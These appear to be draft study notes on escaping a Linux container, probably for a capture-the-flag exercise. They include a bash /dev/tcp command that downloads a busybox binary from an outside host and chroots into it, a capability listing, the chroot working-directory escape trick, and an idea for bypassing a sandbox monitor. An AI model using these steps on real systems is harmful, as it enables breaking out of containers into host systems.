---
title: Untitled 3
tags: []
draft: true
date: 2026-04-08
---

```
export RHOST=files.some-fantastic.com
export RPORT=80
export LFILE=busybox-x86_64/busybox   # <-- change here

bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > busybox'

perl -e 'chmod 0755, "busybox"'
cp busybox /mnt
chroot /mnt/ ./busybox sh

```

what user running as on the host inside the container? 
- look at the mounts listing , in the overlay mount 
- `/etc/mtab` 


capabilities inside container
```
root@5c7a970c6a31:/# cat /proc/self/status | grep Cap
CapInh:	0000000000000000
CapPrm:	00000000800405fb
CapEff:	00000000800405fb
CapBnd:	00000000800405fb
CapAmb:	0000000000000000
```

```
player1@arch ~> capsh --decode=00000000800405fb
0x00000000800405fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_sys_chroot,cap_setfcap
```

we have CAP_SYS_CHROOT and a writable mount somewhere in the host's root filesystem



linux internals

/dev is generated during boot time (?)



chroot /escape moves root barrier down into /escape but the kernel does not move CWD. CWD still points at the old jail root which is above the new root barrier. 

chroot . --> re roots to whereever are now, which is the real / 



---

- monitor to trace different arch syscalls like the x86 syscall
- sandboxed-api would stop the process if the monitor detects that. 
- --> solve: use USER_NOTIF to complete syscall wtihout notifying monitor



https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2024/05/25/chroot-escape

